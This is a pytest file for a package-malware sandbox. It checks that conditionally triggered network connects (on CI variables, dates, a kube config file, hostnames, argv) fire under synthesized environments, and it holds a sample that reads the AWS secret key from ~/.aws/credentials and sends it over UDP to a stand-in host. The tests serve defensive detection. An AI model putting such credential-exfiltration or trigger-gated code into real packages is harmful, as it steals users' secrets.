"""PR 11 of docs/cavr-m2-plan.md, Docker: each trigger type really fires under its spec, and a canary leak is caught.

Every test (CAVR_DOCKER=1) builds a real wheel in `tmp_path` whose module-level branch connects to
198.51.100.24:443 only when its condition holds, takes the frontier entry (`trigger_frontier.frontier`), builds the
spec (`env_synthesis.synthesize`) and runs it (`sandbox_spec.run_spec`) in asent-cavr-sandbox; then the same wheel
under `canary_spec()` (canaries only). The connect must be in the first run's trace and not in the second's.
"""
import hashlib
from pathlib import Path

import pytest

from backend.cavr import env_synthesis, sandbox_spec, trigger_frontier
from tests.test_cavr_support import build_wheel, cavr_containers, requires_docker, sandbox_identity
from tests.test_cavr_trigger_frontier import DENY_ALL

FIRE = ("    try:\n        socket.create_connection(('198.51.100.24', 443), timeout=1)\n"
        "    except OSError:\n        pass\n")
TRIGGERS = {
    "env": ("import os, socket\nif os.environ.get('CI') == 'true':\n", "env"),
    "date": ("import datetime, socket\nif datetime.date.today() >= datetime.date(2027, 1, 1):\n", "time"),
    "file": ("import os, socket\nif os.path.exists(os.path.expanduser('~/.kube/config')):\n", "file"),
    "hostname": ("import socket\nif socket.gethostname() == 'build-prod-7':\n", "host"),
    "argv": ("import socket, sys\nif '--deploy' in sys.argv:\n", "argv"),
}


def wheel_node(tmp_path, source, name="demo"):
    quarantine = tmp_path / "quarantine"
    wheel = build_wheel(quarantine, name, "1.0", files={f"{name}/__init__.py": source})
    data = wheel.read_bytes()
    return [{"name": name, "version": "1.0", "filename": wheel.name, "path": str(wheel),
             "sha256": hashlib.sha256(data).hexdigest()}], quarantine


def run(nodes, quarantine, spec, contract=DENY_ALL):
    got = sandbox_spec.run_spec(nodes, ["demo"], spec, contract=contract, quarantine_dir=quarantine)
    assert cavr_containers() == []
    assert got["evidence"]["home_removed"] is True and not Path(got["evidence"]["home_host"]).exists()
    return got


def connects(got):
    return [e for e in got["events"] if e["type"] == "NETWORK_CONNECT" and e["step"] == "imports"
            and (e.get("address") or {}).get("host") == "198.51.100.24" and e["address"]["port"] == 443]


@requires_docker
@pytest.mark.parametrize("kind", sorted(TRIGGERS))
def test_each_trigger_type_fires_under_its_spec_and_not_without_it(tmp_path, kind):
    sandbox_identity()
    head, family = TRIGGERS[kind]
    nodes, quarantine = wheel_node(tmp_path, head + FIRE)
    found = trigger_frontier.frontier(nodes, DENY_ALL)
    entry, = found["entries"]
    assert entry["families"] == [family] and entry["simulable"] and not entry["baseline_takes_it"], entry
    built = env_synthesis.synthesize(entry)
    assert built["ok"], built["reason"]

    fired = run(nodes, quarantine, built["spec"])
    assert fired["rule"] == "DEEP_NOT_JUDGED", (fired["reason"], fired["output"]["text"])
    assert connects(fired), [e["raw"] for e in fired["events"] if e["step"] == "imports"][:20]
    assert fired["judged"]["result"] == "VIOLATION"

    quiet = run(nodes, quarantine, env_synthesis.canary_spec())
    assert quiet["rule"] == "DEEP_NOT_JUDGED", quiet["reason"]
    assert connects(quiet) == [] and not quiet["canary"]["exfil"] and not quiet["canary"]["unchecked"]
    if kind == "file":
        # The condition itself stats ~/.kube/config, a credential path: a SECRET_READ attempt in every run, which a
        # deny-all contract does not grant. The only violation of the quiet run is that one.
        assert {v["capability"] for v in quiet["judged"]["violations"]} == {"SECRET_READ"}
        assert all(v["event"]["path"] == "/tmp/home/.kube/config" for v in quiet["judged"]["violations"])
    else:
        assert quiet["judged"]["result"] == "OK", quiet["judged"]["reason"]


@requires_docker
def test_the_date_spec_moves_the_packages_clock_and_nothing_else(tmp_path):
    sandbox_identity()
    source = "import datetime\nprint('CLOCK', datetime.datetime.now().isoformat())\n"
    nodes, quarantine = wheel_node(tmp_path, source)
    spec = env_synthesis.canary_spec()
    spec["faketime"] = "2031-05-06 07:08:09"
    got = run(nodes, quarantine, spec)
    assert got["rule"] == "DEEP_NOT_JUDGED", got["reason"]
    assert "CLOCK 2031-05-06T07:08:" in got["output"]["text"]
    assert got["judged"]["result"] == "OK", got["judged"]["reason"]  # libfaketime adds only code loads


@requires_docker
def test_the_win32_wheel_is_unsimulable_and_gets_no_run(tmp_path):
    nodes, _ = wheel_node(tmp_path, "import socket, sys\nif sys.platform == 'win32':\n" + FIRE)
    entry, = trigger_frontier.frontier(nodes, DENY_ALL)["entries"]
    assert entry["simulable"] is False and env_synthesis.synthesize(entry)["ok"] is False
    assert trigger_frontier.frontier_residual(trigger_frontier.frontier(nodes, DENY_ALL), [])["status"] == "UNRESOLVED"


LEAK = """import os, socket
text = open(os.path.expanduser('~/.aws/credentials')).read()
key = [line.split('=', 1)[1].strip() for line in text.splitlines() if line.startswith('aws_secret_access_key')][0]
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
    sock.sendto(key.encode(), ('198.51.100.24', 53))
except OSError:
    pass
"""


@requires_docker
def test_reading_the_fake_aws_key_and_sending_it_is_a_canary_exfiltration_attempt(tmp_path):
    sandbox_identity()
    nodes, quarantine = wheel_node(tmp_path, LEAK)
    spec = env_synthesis.canary_spec()
    got = run(nodes, quarantine, spec)
    assert got["rule"] == "DEEP_NOT_JUDGED", (got["reason"], got["output"]["text"])
    leak, = got["canary"]["exfil"]
    assert leak["canaries"] == ["file:aws-secret-key"] and leak["syscall"] == "sendto" and leak["ok"] is False
    secret = next(c["value"] for c in spec["canaries"] if c["id"] == "file:aws-secret-key")
    assert got["evidence"]["spec"]["canaries"] == spec["canaries"] and secret in leak["raw"]
    assert got["judged"]["result"] == "VIOLATION"
    assert any(v["capability"] == "CANARY_EXFIL" for v in got["judged"]["violations"])
